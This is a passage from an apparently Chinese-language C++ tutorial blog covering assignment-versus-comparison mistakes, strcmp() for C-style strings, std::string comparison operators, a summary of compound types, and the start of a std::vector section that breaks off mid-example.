class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your score: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误: 使用了赋值 =</span></span><br><span class="line">    <span class="keyword">if</span> (score = <span class="number">100</span>) &#123; <span class="comment">// 总是 true，并且 score 被改为 100</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mistake: You entered 100 (or maybe not, score is now 100).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mistake: This part will likely never execute.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after mistaken if: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// score 总是 100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正确: 使用了比较 ==</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter your score again: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line">    <span class="keyword">if</span> (score == <span class="number">100</span>) &#123; <span class="comment">// 正确比较</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: Perfect score!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: Score is not 100.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after correct if: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// score 保持用户输入的值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如何避免:</strong></p><ul><li>  仔细检查条件语句中的 <code>=</code> 和 <code>==</code>。</li><li>  一些编码风格建议将常量放在比较运算符的左边（”Yoda conditions”），例如 <code>if (100 == score)</code>。这样如果意外写成 <code>if (100 = score)</code>，编译器会报错，因为不能给常量赋值。</li></ul><h2 id="5-1-14-C风格字符串的比较"><a href="#5-1-14-C风格字符串的比较" class="headerlink" title="5.1.14 C风格字符串的比较"></a>5.1.14 C风格字符串的比较</h2><p>对于 C 风格字符串（<code>char</code> 数组或 <code>char*</code> 指针），<strong>不能</strong>直接使用关系运算符（<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code> 等）来比较字符串的<strong>内容</strong>。</p><p>当对两个 <code>char*</code> 指针使用 <code>==</code> 或 <code>!=</code> 时，比较的是指针存储的<strong>内存地址</strong>，而不是它们指向的字符串内容。</p><p>要比较 C 风格字符串的内容，需要使用 C 字符串库 <code>&lt;cstring&gt;</code> (或 C 的 <code>&lt;string.h&gt;</code>) 中提供的函数，主要是 <code>strcmp()</code>。</p><ul><li><code>strcmp(str1, str2)</code>:<ul><li>  如果 <code>str1</code> 按字典序等于 <code>str2</code>，返回 0。</li><li>  如果 <code>str1</code> 小于 <code>str2</code>，返回负值。</li><li>  如果 <code>str1</code> 大于 <code>str2</code>，返回正值。</li></ul></li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 为了 strcmp()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> word1[] = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> word2[] = <span class="string">&quot;apply&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> word3[] = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p1 = <span class="string">&quot;banana&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p2 = <span class="string">&quot;banana&quot;</span>; <span class="comment">// 编译器可能将相同的字面值存储在同一地址</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p3 = word1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误: 比较地址</span></span><br><span class="line">    <span class="keyword">if</span> (word1 == word3) &#123; <span class="comment">// 比较两个不同数组的地址，结果通常是 false</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mistake: word1 == word3 (comparing addresses)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mistake: word1 != word3 (comparing addresses)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p1 == p2) &#123; <span class="comment">// 可能 true (如果编译器优化)，也可能 false</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Info: p1 == p2 (compiler might optimize literals)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Info: p1 != p2 (compiler might not optimize literals)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (p3 == word1) &#123; <span class="comment">// true, p3 指向 word1 的起始地址</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Info: p3 == word1 (same address)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正确: 使用 strcmp() 比较内容</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(word1, word3) == <span class="number">0</span>) &#123; <span class="comment">// 比较内容是否相等</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: strcmp(word1, word3) == 0 (contents are equal)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: strcmp(word1, word3) != 0&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(word1, word2) &lt; <span class="number">0</span>) &#123; <span class="comment">// 比较 word1 是否小于 word2</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: strcmp(word1, word2) &lt; 0 (\&quot;apple\&quot; &lt; \&quot;apply\&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-1-15-比较string类字符串"><a href="#5-1-15-比较string类字符串" class="headerlink" title="5.1.15 比较string类字符串"></a>5.1.15 比较string类字符串</h2><p>与 C 风格字符串不同，C++ 的 <code>std::string</code> 类<strong>重载</strong>了所有的关系运算符（<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>）。</p><p>这意味着你可以直接使用这些运算符来比较两个 <code>std::string</code> 对象的<strong>内容</strong>（按字典序进行比较）。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;apply&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s3 = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s4 = <span class="string">&quot;Banana&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接使用 == 比较内容</span></span><br><span class="line">    <span class="keyword">if</span> (s1 == s3) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 == s3 is true (contents are equal)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 == s3 is false&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接使用 !=</span></span><br><span class="line">    <span class="keyword">if</span> (s1 != s2) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 != s2 is true&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 != s2 is false&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接使用 &lt;, &gt; 等进行字典序比较</span></span><br><span class="line">    <span class="keyword">if</span> (s1 &lt; s2) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 &lt; s2 is true (\&quot;apple\&quot; &lt; \&quot;apply\&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s1 &lt; s4) &#123; <span class="comment">// 比较 &quot;apple&quot; 和 &quot;Banana&quot;</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 &lt; s4 is true (\&quot;apple\&quot; &gt; \&quot;Banana\&quot; due to case)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">        <span class="comment">// 注意：比较是区分大小写的，&#x27;a&#x27; 的 ASCII 值大于 &#x27;B&#x27;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 &lt; s4 is false (\&quot;apple\&quot; &gt; \&quot;Banana\&quot; due to case)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以和 C 风格字符串字面值比较</span></span><br><span class="line">    <span class="keyword">if</span> (s1 == <span class="string">&quot;apple&quot;</span>) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 == \&quot;apple\&quot; is true&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>std::string</code> 进行字符串比较比使用 C 风格字符串和 <code>strcmp()</code> 更直观、更安全。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.11 总结</title>
      <link href="2025/04/26/4.11_%E6%80%BB%E7%BB%93/"/>
      <url>2025/04/26/4.11_%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本章介绍了C++的**复合类型 (Compound Types)**，它们允许我们将多个值组合成一个数据单元。</p><p>我们首先学习了**数组 (Array)**，它用于存储一系列相同类型的数据。我们了解了如何声明数组、使用索引访问元素（从0开始），以及初始化数组的各种规则，包括C++11引入的更安全的列表初始化方法。我们强调了数组大小必须是常量表达式，并且访问数组时需要注意边界，避免越界访问。</p><p>接着，我们探讨了处理文本数据的两种方式。第一种是传统的<strong>C风格字符串</strong>，即以空字符 <code>\0</code> 结尾的 <code>char</code> 数组。我们学习了如何拼接字符串常量、在数组中使用字符串、以及使用 <code>cin</code> 和 <code>getline</code> 读取字符串输入，并特别注意了混合输入数字和整行字符串时可能遇到的问题。</p><p>第二种，也是C++中更推荐的方式，是使用标准库提供的 <strong><code>string</code> 类</strong>。<code>string</code> 类提供了自动内存管理、方便的赋值、拼接 (<code>+</code>) 和附加 (<code>+=</code>) 操作，以及大量用于查找、修改、比较和访问字符的成员函数。我们还学习了如何使用 <code>cin</code>, <code>cout</code>, 和 <code>getline</code> 对 <code>string</code> 对象进行输入输出，并了解了C++11引入的原始字符串字面值和Unicode字符串字面值。</p><p><strong>结构 (Structure)</strong> 被引入作为一种创建自定义复合类型的方式，允许将不同类型的数据项（成员）组合在一起。我们学习了如何定义结构、声明结构变量、使用点运算符 (<code>.</code>) 访问成员，以及C++11的列表初始化。我们还看到结构体可以包含 <code>string</code> 对象或数组作为成员，结构变量可以相互赋值，可以作为函数参数（按值、按引用、按指针）和返回值。<strong>结构数组</strong>允许我们管理一组结构对象，而<strong>位字段</strong>则提供了一种在结构内精确控制成员占用位数的方式。</p><p><strong>共用体 (Union)</strong> 作为另一种复合类型被介绍，其特点是所有成员共享同一块内存空间，主要用于节省内存或进行类型双关（需谨慎）。我们了解了如何定义和访问共用体，以及使用匿名共用体。</p><p><strong>枚举 (Enum)</strong> 提供了一种创建具名整数常量的方式，提高了代码的可读性和类型安全。我们学习了如何定义枚举、显式设置枚举量的值、枚举的取值范围，并简要介绍了C++11引入的更安全的**作用域内枚举 (<code>enum class</code>)**。</p><p>本章的一个核心内容是<strong>指针 (Pointer)</strong> 和**自由存储空间 (Free Store / Heap)**。指针是存储内存地址的变量。我们学习了如何声明和初始化指针（包括使用 <code>&amp;</code> 获取地址和初始化为 <code>nullptr</code>），如何使用解引用运算符 <code>*</code> 访问指针指向的值，并强调了使用未初始化指针、空指针或悬挂指针的危险。</p><p>我们学习了使用 <code>new</code> 运算符在自由存储区动态分配内存（用于单个变量或对象），以及使用 <code>delete</code> 运算符释放这些内存。同样，我们学习了使用 <code>new[]</code> 动态分配数组，并强调<strong>必须</strong>使用 <code>delete[]</code> 来释放动态数组内存。正确配对 <code>new</code>/<code>delete</code> 和 <code>new[]</code>/<code>delete[]</code> 对于避免内存泄漏和程序崩溃至关重要。</p><p>指针与数组的紧密关系以及<strong>指针算术</strong>也被详细讨论。数组名通常可视为指向第一个元素的指针，指针算术允许在数组元素间移动。我们还看到了如何使用指针处理C风格字符串，以及如何动态创建结构并使用箭头运算符 (<code>-&gt;</code>) 通过指针访问其成员。最后，我们区分了三种主要的存储持续性：自动存储（栈）、静态存储和动态存储（堆）。</p><p>我们还探讨了如何<strong>组合</strong>这些类型，例如创建包含数组或指针成员的结构、指针数组以及指向指针的指针，以构建更复杂的数据表示。</p><p>最后，我们介绍了C++标准库提供的内置数组的现代替代品：**<code>std::vector</code>**（动态大小数组）和 **<code>std::array</code>**（固定大小数组，C++11）。它们提供了更安全、更方便的接口和自动内存管理（对于 <code>vector</code>），是现代C++编程中推荐的选择。</p><p>通过本章的学习，我们掌握了创建和使用各种复合数据类型以及进行动态内存管理的基本技能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.10 数组的替代品</title>
      <link href="2025/04/26/4.10_%E6%95%B0%E7%BB%84%E7%9A%84%E6%9B%BF%E4%BB%A3%E5%93%81/"/>
      <url>2025/04/26/4.10_%E6%95%B0%E7%BB%84%E7%9A%84%E6%9B%BF%E4%BB%A3%E5%93%81/</url>
      
        <content type="html"><![CDATA[<p>虽然 C++ 内置的数组（包括动态分配的数组）功能强大，但它们存在一些固有的缺点：数组大小通常需要在编译时确定（对于栈上的数组），或者需要手动进行动态内存管理（对于堆上的数组），并且不提供边界检查等安全特性。</p><p>C++ 标准模板库 (STL) 提供了更安全、更灵活的数组替代品：<code>vector</code> 和 <code>array</code>。</p><h2 id="4-10-1-模板类vector"><a href="#4-10-1-模板类vector" class="headerlink" title="4.10.1 模板类vector"></a>4.10.1 模板类vector</h2><p><code>std::vector</code> 是 STL 提供的一个<strong>动态数组</strong>模板类。它封装了动态大小的数组，可以根据需要自动增长或缩小，并负责管理其元素的内存。</p><p><strong>特点:</strong></p><ul><li>  <strong>动态大小:</strong> 可以在运行时添加或删除元素，<code>vector</code> 会自动处理内存的重新分配。</li><li>  <strong>内存管理:</strong> 自动管理元素存储的内存（通常在自由存储区/堆上分配）。</li><li>  <strong>随机访问:</strong> 像普通数组一样，可以通过索引 <code>[]</code> 快速访问任何元素。</li><li>  <strong>边界检查 (可选):</strong> 提供 <code>at()</code> 成员函数进行带边界检查的元素访问。</li><li>  <strong>丰富的成员函数:</strong> 提供 <code>push_back()</code>, <code>pop_back()</code>, <code>size()</code>, <code>empty()</code>, <code>clear()</code>, <code>insert()</code>, <code>erase()</code> 等多种方便的操作。</li><li>  <strong>模板类:</strong> <code>vector</code> 是一个模板，需要指定存储的元素类型，例如 <code>std::vector&lt;int&gt;</code>, <code>std::vector&lt;double&gt;</code>, <code>std::vector&lt;std::string&gt;</code>。</li></ul><p><strong>使用方法:</strong></p><ol><li> <strong>包含头文件:</strong> <code>#include &lt;vector&gt;</code></li><li><strong>声明和初始化:</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; scores; <span class="comment">// 创建一个空的 int vector</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt; <span class="title">lengths</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// 创建包含 10 个 double 元素的 vector (默认初始化为 0.0)</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="title">names</span><span class="params">(<span class="number">5</span>, <span class="string">&quot;Unknown&quot;</span>)</span></span>; <span class="comment">// 创建包含 5 个 string 元素，都初始化为 &quot;Unknown&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C++11 列表初始化</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; primes &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>&#125;; <span class="comment">// 创建并初始化</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; vowels &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>&#125;;</span><br></pre></td></tr></table></figure></li><li><strong>访问元素:</strong><ul><li>  <code>[]</code> 运算符: <code>scores[0]</code>, <code>names[i]</code> (不进行边界检查)。</li><li>  <code>at()</code> 函数: <code>scores.at(0)</code>, <code>names.at(i)</code> (进行边界检查，越界抛出 <code>std::out_of_range</code> 异常)。</li></ul></li><li><strong>常用操作:</strong><ul><li>  <code>push_back(value)</code>: 在 <code>vector</code> 末尾添加一个元素。</li><li>  <code>size()</code>: 返回 <code>vector</code> 中元素的数量。</li><li>  <code>empty()</code>: 检查 <code>vector</code> 是否为空。</li><li>  <code>clear()</code>: 移除所有元素。</li><li>  <code>pop_back()</code>: 移除末尾的元素。</li></ul></li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建和初始化</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers; <span class="comment">// 空 vector</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; tasks &#123;<span class="string">&quot;Read&quot;</span>, <span class="string">&quot;Write&quot;</span>, <span class="string">&quot;Code&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加元素</span></span><br><span class="line">    numbers.push_back(<span class="number">10</span>); <span class="comment">// numbers: &#123;10&#125;</span></span><br><span class="line">    numbers.push_back(<span class="number">20</span>); <span class="comment">// numbers: &#123;10, 20&#125;</span></span><br><span class="line">    numbers.push_back(<span class="number">30</span>); <span class="comment">// numbers: &#123;10, 20, 30&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问元素</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First number: &quot;</span> &lt;&lt; numbers[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Second task: &quot;</span> &lt;&lt; tasks.at(<span class="number">1</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Write</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; tasks.at(3); // 会抛出异常</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改元素</span></span><br><span class="line">    numbers[<span class="number">0</span>] = <span class="number">15</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取大小</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of tasks: &quot;</span> &lt;&lt; tasks.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历 vector (C++11 基于范围的 for 循环)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Numbers:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : numbers) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Numbers: 15 20 30</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历 vector (传统 for 循环)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span 